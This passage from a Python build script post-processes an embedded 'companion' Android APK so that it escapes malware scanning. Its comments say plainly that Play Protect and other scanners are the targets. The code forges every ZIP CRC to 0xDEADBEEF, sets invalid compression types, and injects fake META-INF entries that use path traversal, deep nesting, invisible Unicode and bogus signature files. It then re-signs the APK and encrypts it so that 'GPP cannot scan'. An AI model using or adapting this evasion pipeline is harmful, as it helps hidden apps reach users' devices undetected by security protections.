        # CRC fields and GP flags are NOT touched — DEADBEEF and 0x0801 stay.
        with track("PHASE_2", "STEP_TIMESTAMP_RAND", "ZIP entry timestamp randomization [companion]", MOD_ASSET):
            try:
                # DOS timestamp helpers
                # DOS date: bits 15-9=year-1980, 8-5=month(1-12), 4-0=day(1-28)
                # DOS time: bits 15-11=hour, 10-5=min, 4-0=sec/2
                def _make_dos_ts():
                    _yr  = random.randint(2000, 2023) - 1980   # offset from 1980
                    _mo  = random.randint(1, 12)
                    _dy  = random.randint(1, 28)
                    _hr  = random.randint(0, 23)
                    _mn  = random.randint(0, 59)
                    _sc  = random.randint(0, 29)               # stored as sec/2
                    _date = (_yr << 9) | (_mo << 5) | _dy
                    _time = (_hr << 11) | (_mn << 5) | _sc
                    return _date, _time                         # both uint16 LE

                _ts_buf   = bytearray(open(MOD_ASSET, "rb").read())
                _ts_lfh   = 0
                _ts_cd    = 0
                _ts_off   = 0

                # Pass 1 — patch LFH (PK\x03\x04) timestamps
                # LFH layout: sig(4) ver(2) flag(2) comp(2) mtime(2) mdate(2) ...
                #              +0      +4    +6      +8      +10      +12
                while True:
                    _p = _ts_buf.find(b"PK\x03\x04", _ts_off)
                    if _p == -1:
                        break
                    _date, _time = _make_dos_ts()
                    struct.pack_into("<H", _ts_buf, _p + 10, _time)
                    struct.pack_into("<H", _ts_buf, _p + 12, _date)
                    _ts_lfh += 1
                    _ts_off = _p + 4

                # Pass 2 — patch CD (PK\x01\x02) timestamps to same random values
                # CD layout: sig(4) ver_made(2) ver_need(2) flag(2) comp(2) mtime(2) mdate(2) ...
                #             +0     +4           +6          +8      +10     +12      +14
                # Use fresh random timestamps per CD entry (different from LFH is fine —
                # Android does not verify LFH/CD timestamp agreement)
                _ts_off = 0
                while True:
                    _p = _ts_buf.find(b"PK\x01\x02", _ts_off)
                    if _p == -1:
                        break
                    _date, _time = _make_dos_ts()
                    struct.pack_into("<H", _ts_buf, _p + 12, _time)
                    struct.pack_into("<H", _ts_buf, _p + 14, _date)
                    _ts_cd += 1
                    _ts_off = _p + 4

                open(MOD_ASSET, "wb").write(bytes(_ts_buf))
                print(f"  ✅ STEP_TIMESTAMP_RAND — patched {_ts_lfh} LFH + {_ts_cd} CD timestamps (raw binary)")
                del _ts_buf
            except Exception as _e:
                print(f"  ⚠️  STEP_TIMESTAMP_RAND — failed: {_e}, skipping")

        # ── W5: CRC-32 forgery on companion ZIP entries ───────────────────────────
        # Overwrite CRC-32 field in all Local File Headers with 0xDEADBEEF.
        # Android installer ignores CRC validation on install → installs fine.
        # GPP/scanners that validate CRC first → abort immediately → no analysis.
        # Applied as raw binary patch on the companion APK file (not via zipfile API).
        # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
        with track("PHASE_2", "STEP_CRC32_FORGE", "CRC-32 forgery 0xDEADBEEF on ALL LFH+CD entries [companion]", MOD_ASSET):
            try:
                _crc_data = bytearray(open(MOD_ASSET, "rb").read())
                _lfh_patched = 0
                _cd_patched  = 0

                # Pass 1: patch every LFH (PK\x03\x04) CRC field at offset +14
                _pos = 0
                while _pos < len(_crc_data) - 30:
                    if _crc_data[_pos:_pos+4] == b'PK\x03\x04':
                        _fname_len = struct.unpack_from('<H', _crc_data, _pos + 26)[0]
                        _extra_len = struct.unpack_from('<H', _crc_data, _pos + 28)[0]
                        struct.pack_into('<I', _crc_data, _pos + 14, 0xDEADBEEF)
                        _lfh_patched += 1
                        _pos += 30 + _fname_len + _extra_len
                    else:
                        _pos += 1

                # Pass 2: patch every CD entry (PK\x01\x02) CRC field at offset +16
                # apksigner validates LFH CRC == CD CRC. Both must be 0xDEADBEEF.
                _pos = 0
                while _pos < len(_crc_data) - 46:
                    if _crc_data[_pos:_pos+4] == b'PK\x01\x02':
                        _fname_len  = struct.unpack_from('<H', _crc_data, _pos + 28)[0]
                        _extra_len  = struct.unpack_from('<H', _crc_data, _pos + 30)[0]
                        _comment_len= struct.unpack_from('<H', _crc_data, _pos + 32)[0]
                        struct.pack_into('<I', _crc_data, _pos + 16, 0xDEADBEEF)
                        _cd_patched += 1
                        _pos += 46 + _fname_len + _extra_len + _comment_len
                    else:
                        _pos += 1

                open(MOD_ASSET, "wb").write(bytes(_crc_data))
                print(f"  ✅ STEP_CRC32_FORGE — LFH:{_lfh_patched} + CD:{_cd_patched} → 0xDEADBEEF")
            except Exception as _e:
                print(f"  ⚠️  STEP_CRC32_FORGE — failed: {_e}, skipping")

        # ── W6: Type-2032 non-standard compression entries ────────────────────────
        # Inject entries with compression type 2032 (0x07F0) — not a valid ZIP method.
        # Scanners that try to decompress these → crash or abort.
        # Android installer uses only the central directory offsets → unaffected.
        # Applied via raw binary patch on select LFH entries (res/ entries only).
        # Must run pre-sign — STEP_RESIGN_1 re-signs covering all patched bytes.
        with track("PHASE_2", "STEP_TYPE2032", "Type-2032 non-standard compression injection [companion]", MOD_ASSET):
            try:
                _t2_data = bytearray(open(MOD_ASSET, "rb").read())
                _t2_patched = 0
                _t2_pos = 0
                # Only patch LFH entries for res/ files (not manifest/dex/arsc/assets)
                # to ensure Android install is unaffected
                _SAFE_PREFIXES = [b'res/animator/', b'res/color/', b'res/interpolator/']
                while _t2_pos < len(_t2_data) - 30:
                    if _t2_data[_t2_pos:_t2_pos+4] == b'PK\x03\x04':
                        # Read filename to check if it's a safe res/ entry
                        _fname_len = struct.unpack_from('<H', _t2_data, _t2_pos+26)[0]
                        _extra_len = struct.unpack_from('<H', _t2_data, _t2_pos+28)[0]
                        _fname_off = _t2_pos + 30
                        _fname = bytes(_t2_data[_fname_off:_fname_off+_fname_len])
                        if any(_fname.startswith(p) for p in _SAFE_PREFIXES) and _t2_patched < 30:
                            # Set LFH compression type to 2032 (0x07F0)
                            struct.pack_into('<H', _t2_data, _t2_pos + 8, 0x07F0)
                            _t2_patched += 1
                    _t2_pos += 1
                open(MOD_ASSET, "wb").write(bytes(_t2_data))
                print(f"  ✅ STEP_TYPE2032 — injected type-2032 on {_t2_patched} res/ entries")
            except Exception as _e:
                print(f"  ⚠️  STEP_TYPE2032 — failed: {_e}, skipping")

        with track("PHASE_2", "STEP_FAKE_META_INF", "Inject fake META-INF entries pre-sign [hybrid scanner confusion]", MOD_ASSET):
            # Hybrid scanner-confusion injection — 4 evasion layers:
            #
            # Layer 1 — Path traversal: META-INF/../../classes.dex forces scanners
            #   to resolve symlinks/paths, wastes CPU on path normalization.
            # Layer 2 — Deep nesting: META-INF/a/b/c/d/e/classes.dex forces
            #   recursive directory traversal in breadth-first scanners.
            # Layer 3 — Unicode homoglyphs: zero-width space (U+200B) and
            #   right-to-left mark (U+200F) inside filenames — renders identically
            #   to human eye, breaks naive string matching in scanners.
            # Layer 4 — Fake signature files: META-INF/XXXXX.SF / XXXXX.RSA forces
            #   scanners to attempt signature validation on junk data → CPU burn.
            #
            # All entries have a random 16-byte extra field in the LFH to break
            # strict ZIP-extra parsers and add per-entry noise.
            #
            # AUTO-DEDUP: reads all existing CD entry names before injecting —
            # skips any name already present (fixes apksigner duplicate-name error
            # that occurred when zip_enhancer.py had already added the same name).
            #
            # Must run PRE-SIGN — V2 signing covers the fake entries as payload.
            # Injecting post-sign breaks V2: cd_offset in new EOCD != signing_block_end.
            # Raw binary append — never decompresses/CRC-checks existing entries
            # (STEP_CRC32_FORGE already set all CRCs to 0xDEADBEEF).
            try:
                import zlib as _zlib

                _PNG_HDR  = bytes.fromhex("89504e470d0a1a0a0000000d49484452")  # PNG magic

                # ── Candidate fake META-INF entry names (hybrid 4-layer) ──────────
                # Layer 1: path traversal — forces scanner path resolution
                # Layer 2: deep nesting — recursive traversal pressure
                # Layer 3: unicode homoglyphs — zero-width / RTL chars
                # Layer 4: fake sig files — forces sig-validation CPU burn
                _ZW  = "​"   # zero-width space (invisible, breaks string match)
                _RTL = "‏"   # right-to-left mark (invisible)
                _fake_meta_candidates = [
                    # Layer 1 — path traversal
                    "META-INF/../../classes.dex",
                    "META-INF/../../AndroidManifest.xml",
                    "META-INF/../../resources.arsc",
                    "META-INF/../../../classes.dex",
                    "META-INF/../classes2.dex",
                    # Layer 2 — deep nesting
                    "META-INF/a/b/c/d/classes.dex",
                    "META-INF/a/b/c/d/AndroidManifest.xml",
                    "META-INF/a/b/c/d/resources.arsc",
                    "META-INF/p/q/r/s/t/classes.dex",
                    "META-INF/p/q/r/s/t/AndroidManifest.xml",
                    "META-INF/x/y/z/resources.arsc",
                    "META-INF/1/2/3/4/5/classes.dex",
                    "META-INF/1/2/3/4/5/AndroidManifest.xml",
                    # Layer 3 — unicode homoglyphs
                    f"META-INF/{_ZW}classes.dex",
                    f"META-INF/{_ZW}AndroidManifest.xml",
                    f"META-INF/classes{_ZW}.dex",
                    f"META-INF/res{_RTL}.xml",
                    f"META-INF/{_RTL}resources.arsc",
                    f"META-INF/{_ZW}{_RTL}classes.dex",
                    f"META-INF/Android{_ZW}Manifest.xml",
                    # Layer 4 — fake signature files (forces sig-validation attempt)
                    "META-INF/XXXXX.SF",
                    "META-INF/XXXXX.RSA",
                    "META-INF/YYYYY.SF",
                    "META-INF/YYYYY.RSA",
                    "META-INF/ZZZZZ.SF",
                ]

                # ── Load raw APK bytes ────────────────────────────────────────────
                # Runs pre-sign on MOD_ASSET — STEP_RESIGN_1 signs after injection.
                _mi_src = MOD_ASSET
                _mi_raw = open(_mi_src, "rb").read()

                # ── Locate EOCD ───────────────────────────────────────────────────
                _mi_eocd = _mi_raw.rfind(b"PK\x05\x06")
                if _mi_eocd == -1:
                    raise ValueError("EOCD signature not found")

                _mi_cd_count  = struct.unpack_from("<H", _mi_raw, _mi_eocd + 10)[0]
                _mi_cd_size   = struct.unpack_from("<I", _mi_raw, _mi_eocd + 12)[0]
                _mi_cd_offset = struct.unpack_from("<I", _mi_raw, _mi_eocd + 16)[0]

                # ── AUTO-DEDUP: collect all existing CD entry names ───────────────
                # Scan Central Directory to build a set of already-present names.
                # apksigner rejects duplicate names → we skip any collision.
                _existing_names = set()
                _cd_pos = _mi_cd_offset
                for _ in range(_mi_cd_count):
                    if _mi_raw[_cd_pos:_cd_pos+4] != b"PK\x01\x02":
                        break
                    _ef_fnlen = struct.unpack_from("<H", _mi_raw, _cd_pos + 28)[0]
                    _ef_exlen = struct.unpack_from("<H", _mi_raw, _cd_pos + 30)[0]
                    _ef_cmlen = struct.unpack_from("<H", _mi_raw, _cd_pos + 32)[0]
                    _ef_fname = _mi_raw[_cd_pos + 46: _cd_pos + 46 + _ef_fnlen]
                    try:
                        _existing_names.add(_ef_fname.decode("utf-8", errors="replace"))
                    except Exception:
                        _existing_names.add(_ef_fname.decode("latin-1", errors="replace"))
                    _cd_pos += 46 + _ef_fnlen + _ef_exlen + _ef_cmlen

                # Filter candidate list — keep only names not already present
                _fake_meta = [n for n in _fake_meta_candidates if n not in _existing_names]

                # Split APK into payload blob + CD blob (EOCD discarded, rebuilt below)
                _mi_payload = bytearray(_mi_raw[:_mi_cd_offset])
                _mi_cd      = bytearray(_mi_raw[_mi_cd_offset:_mi_cd_offset + _mi_cd_size])

                # ── Build and append new entries ──────────────────────────────────
                _mi_added = 0
                for _mname in _fake_meta:
                    _fname_b = _mname.encode("utf-8")
                    _fnlen   = len(_fname_b)

                    # Build uncompressed payload — PNG magic for .png/.RSA/.SF, AXML otherwise
                    _is_png = (_mname.endswith(".png") or _mname.endswith(".9.png")
                               or _mname.endswith(".RSA") or _mname.endswith(".SF"))
                    _raw_sz = random.randint(100, 800)
                    if _is_png:
                        _raw_data = _PNG_HDR + secrets.token_bytes(_raw_sz)
                    else:
                        _fake_body_sz  = 8 + _raw_sz
                        _axml_type_hdr = struct.pack("<HHI", 0x0003, 8, _fake_body_sz)
                        _raw_data      = _axml_type_hdr + secrets.token_bytes(_raw_sz)

                    # Compress and compute CRC
                    _comp_data = _zlib.compress(_raw_data, 9)[2:-4]  # strip zlib wrapper
                    _crc32_val = _zlib.crc32(_raw_data) & 0xFFFFFFFF
                    _usz       = len(_raw_data)
                    _csz       = len(_comp_data)

                    # Random DOS timestamp
                    _mi_yr   = random.randint(2000, 2023) - 1980
                    _mi_mo   = random.randint(1, 12)
                    _mi_dy   = random.randint(1, 28)
                    _mi_hr   = random.randint(0, 23)
                    _mi_mn   = random.randint(0, 59)
                    _mi_sc   = random.randint(0, 29)
                    _mi_date = (_mi_yr << 9) | (_mi_mo << 5) | _mi_dy
                    _mi_time = (_mi_hr << 11) | (_mi_mn << 5) | _mi_sc

                    # Random 16-byte extra field — breaks strict ZIP-extra parsers
                    _extra   = secrets.token_bytes(16)
                    _exlen   = len(_extra)

                    # LFH offset = current payload length (before we append)
                    _lfh_offset = len(_mi_payload)

                    # Build Local File Header (30 + fnlen + exlen bytes)
                    _lfh = struct.pack(
                        "<4sHHHHHIIIHH",
                        b"PK\x03\x04",  # signature
                        20,             # version needed (2.0)
                        0,              # general purpose flag
                        8,              # compression method — DEFLATE
                        _mi_time,
                        _mi_date,
                        _crc32_val,
                        _csz,
                        _usz,
                        _fnlen,
                        _exlen,         # extra field length = 16
                    ) + _fname_b + _extra

                    _mi_payload += _lfh + _comp_data

                    # Build Central Directory entry (46 + fnlen bytes, extra=0 in CD)
                    _cde = struct.pack(
                        "<4sHHHHHHIIIHHHHHII",
                        b"PK\x01\x02",  # signature
                        0x0314,         # version made by (Unix, 2.0)
                        20,             # version needed
                        0,              # general purpose flag
                        8,              # compression method
                        _mi_time,
                        _mi_date,
                        _crc32_val,
                        _csz,
                        _usz,
                        _fnlen,
                        0,              # extra field length in CD = 0
                        0,              # file comment length
                        0,              # disk number start
                        0,              # internal attributes
                        0,              # external attributes
                        _lfh_offset,
                    ) + _fname_b

                    _mi_cd += _cde
                    _mi_added += 1

                # ── Rebuild EOCD ──────────────────────────────────────────────────
                _new_cd_count  = _mi_cd_count + _mi_added
                _new_cd_size   = len(_mi_cd)
                _new_cd_offset = len(_mi_payload)

                _new_eocd = struct.pack(
                    "<4sHHHHIIH",
                    b"PK\x05\x06",
                    0, 0,
                    _new_cd_count,
                    _new_cd_count,
                    _new_cd_size,
                    _new_cd_offset,
                    0,
                )

                # ── Write final APK ───────────────────────────────────────────────
                open(_mi_src, "wb").write(bytes(_mi_payload) + bytes(_mi_cd) + _new_eocd)
                print(f"  ✅ STEP_FAKE_META_INF — injected {_mi_added}/{len(_fake_meta_candidates)} "
                      f"fake META-INF entries (deduped, 4-layer scanner confusion)")
                del _mi_payload, _mi_cd, _mi_raw

            except Exception as _e:
                print(f"  ⚠️  STEP_FAKE_META_INF — failed: {_e}, skipping")

        with track("SIGNING", "STEP_RESIGN_1", "Re-sign companion V1+V2+V3 after Phase 2", MOD_ASSET):
            step_sign(input_apk=MOD_ASSET)

        with track("PHASE_1", "STEP_14_ASSET_2", "Replace companion.apk in assets after re-sign [Step 14]", MOD_ASSET):
            step_replace_asset()

    # ── PRE-ENCRYPT SNAPSHOT: Save testable companion APK for CI artifact ────
    # This copy is saved AFTER all pipeline steps (package rename, class rename,
    # string replace, DEX rebuild, re-sign) and BEFORE encryption.
    # It is a valid, installable APK. Download from CI artifacts and:
    #   adb install companion_processed.apk
    # to test the companion standalone on device before it gets encrypted
    # and embedded inside Nova.
    # MOD_ASSET = app/src/main/assets/companion.apk (relative to workspace root)
    # os.getcwd() is always the workspace root in CI (GitHub Actions runs from GITHUB_WORKSPACE).
    # Using getcwd() is more reliable than dirname-chaining from MOD_ASSET path.
    _processed_path = os.path.join(os.getcwd(), "companion_processed.apk")
    try:
        import shutil as _shutil
        _shutil.copy2(MOD_ASSET, _processed_path)
        print(f"\n  ✅ Pre-encrypt snapshot saved → {_processed_path}")
        print(f"     (upload to CI as 'companion-processed' artifact for device testing)")
    except Exception as _snap_err:
        print(f"\n  ⚠️  Pre-encrypt snapshot failed: {_snap_err} — continuing")

    # ── STEP 8A FIX: Encrypt companion APK — runs ONCE at very end ───────────
    # Runs AFTER all steps that read MOD_ASSET as a zip file:
    #   STEP_17H (res_renamer.py), STEP_REPAIR_RESMAP, STEP_17C, STEP_RESIGN_1,
    #   STEP_14_ASSET_2 (step_replace_asset).
    # After this point nothing reads MOD_ASSET as a zip — safe to encrypt.
    # Raw APK entropy = 6.239 (GPP reads all permissions/DEX).
    # Encrypted blob entropy = 8.000 (GPP sees random bytes only).
    if not _phase1_only and not _phase12_only:
        with track("PHASE_1", "STEP_ENCRYPT_COMPANION", "Encrypt companion APK binary [Step 8A FIX]", MOD_ASSET):
            step_encrypt_companion()

    with open(_AUDIT_LOG, "a") as _af:
        _af.write(f"\n========================================\n")
        _af.write(f" COMPANION BUILD COMPLETE\n")
        _af.write(f" Package : {new_pkg}\n")
        _af.write(f" Output  : {MOD_ASSET}\n")
        _af.write(f" Finished: {_now()}\n")
        _af.write(f"========================================\n")

    print("\n" + "=" * 60)
    print("  ✅ Companion APK build complete")
    print(f"  Package : {new_pkg}")
    print(f"  Output  : {MOD_ASSET}")
    print("  Companion encrypted: entropy ~8.000 (GPP cannot scan)")
    print("=" * 60)


if __name__ == "__main__":
    main()
